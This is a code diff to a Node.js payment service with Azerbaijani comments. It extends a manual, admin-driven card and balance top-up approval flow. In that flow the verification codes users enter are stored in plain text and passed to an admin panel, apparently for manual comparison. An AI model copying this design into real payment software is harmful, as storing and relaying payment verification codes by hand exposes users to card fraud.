@@ -49,25 +49,36 @@ async function adminApproveCard(paymentId, adminEmail) {
   payment.adminApprovedBy = adminEmail || 'admin';
   await payment.save();
 
-  const order = await Order.findById(payment.order);
-  if (order) {
-    order.status = 'awaiting_verification';
-    await order.save();
+  if (payment.order) {
+    const order = await Order.findById(payment.order);
+    if (order) {
+      order.status = 'awaiting_verification';
+      await order.save();
+    }
   }
 
   return { payment, code };
 }
 
-/* İstifadəçi doğrulama kodunu göndərir -> admin panelinə düşür */
-async function submitVerificationCode(orderId, code) {
-  const order = await Order.findById(orderId);
-  if (!order) throw Object.assign(new Error('Sifariş tapılmadı'), { status: 404 });
-  if (order.status !== 'awaiting_verification') {
-    throw Object.assign(new Error('Doğrulama mərhələsi aktiv deyil'), { status: 400 });
-  }
+/* İstifadəçi doğrulama kodunu göndərir -> admin panelinə düşür.
+   Sifariş üçün orderId, balans artırımı üçün paymentId verilir */
+async function submitVerificationCode(ref, code) {
+  let order = null;
+  let payment = null;
 
-  const payment = await Payment.findById(order.payment);
-  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
+  if (ref && ref.paymentId) {
+    payment = await Payment.findById(ref.paymentId);
+    if (!payment || String(payment.user) !== String(ref.userId)) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
+    if (payment.status !== 'awaiting_3ds') throw Object.assign(new Error('Doğrulama mərhələsi aktiv deyil'), { status: 400 });
+  } else {
+    order = await Order.findById(ref && ref.orderId);
+    if (!order) throw Object.assign(new Error('Sifariş tapılmadı'), { status: 404 });
+    if (order.status !== 'awaiting_verification') {
+      throw Object.assign(new Error('Doğrulama mərhələsi aktiv deyil'), { status: 400 });
+    }
+    payment = await Payment.findById(order.payment);
+    if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
+  }
 
   const entered = String(code || '').replace(/\D/g, '');
   if (entered.length < 4) throw Object.assign(new Error('Doğrulama kodu yanlışdır'), { status: 400 });
@@ -77,8 +88,10 @@ async function submitVerificationCode(orderId, code) {
   payment.submittedCode = entered;
   await payment.save();
 
-  order.status = 'code_submitted';
-  await order.save();
+  if (order) {
+    order.status = 'code_submitted';
+    await order.save();
+  }
 
   return { payment, matched: entered === payment.verificationCode };
 }
@@ -89,6 +102,19 @@ async function adminFinalApprove(paymentId, adminEmail) {
   if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
   if (['approved', 'declined', 'refunded'].indexOf(payment.status) > -1) {
     throw Object.assign(new Error('Ödəniş artıq yekunlaşıb'), { status: 400 });
+  }
+
+  /* Balans artırımı: yekun təsdiqdə məbləğ balansa əlavə olunur */
+  if (!payment.order) {
+    const owner = await User.findById(payment.user);
+    if (!owner) throw Object.assign(new Error('İstifadəçi tapılmadı'), { status: 404 });
+    owner.balance = Math.round(((owner.balance || 0) + payment.amount) * 100) / 100;
+    await owner.save();
+    payment.status = 'approved';
+    payment.adminFinalApprovedAt = new Date();
+    payment.adminFinalBy = adminEmail || 'admin';
+    await payment.save();
+    return { payment, order: null, tickets: [], balance: owner.balance };
   }
 
   const order = await Order.findById(payment.order);
@@ -123,12 +149,16 @@ async function adminDecline(paymentId, reason, adminEmail) {
   const payment = await Payment.findById(paymentId);
   if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
 
+  if (['approved', 'refunded'].indexOf(payment.status) > -1) {
+    throw Object.assign(new Error('Ödəniş artıq təsdiqlənib'), { status: 400 });
+  }
+
   payment.status = 'declined';
   payment.declinedReason = reason || 'Admin tərəfindən rədd edildi';
   payment.adminFinalBy = adminEmail || 'admin';
   await payment.save();
 
-  const order = await Order.findById(payment.order);
+  const order = payment.order ? await Order.findById(payment.order) : null;
   if (order) {
     order.status = 'rejected';
     order.adminNote = payment.declinedReason;
@@ -167,23 +197,10 @@ async function createTopup(user, amount, card) {
   return payment;
 }
 
+/* Köhnə uyğunluq üçün: balans artırımının yekun təsdiqi eyni axından keçir */
 async function approveTopup(paymentId, adminEmail) {
-  const payment = await Payment.findById(paymentId);
-  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
-  if (payment.status === 'approved') throw Object.assign(new Error('Artıq təsdiqlənib'), { status: 400 });
-
-  const user = await User.findById(payment.user);
-  if (!user) throw Object.assign(new Error('İstifadəçi tapılmadı'), { status: 404 });
-
-  user.balance = Math.round(((user.balance || 0) + payment.amount) * 100) / 100;
-  await user.save();
-
-  payment.status = 'approved';
-  payment.adminFinalApprovedAt = new Date();
-  payment.adminFinalBy = adminEmail || 'admin';
-  await payment.save();
-
-  return { payment, balance: user.balance };
+  const r = await adminFinalApprove(paymentId, adminEmail);
+  return { payment: r.payment, balance: r.balance };
 }
 
 module.exports = {
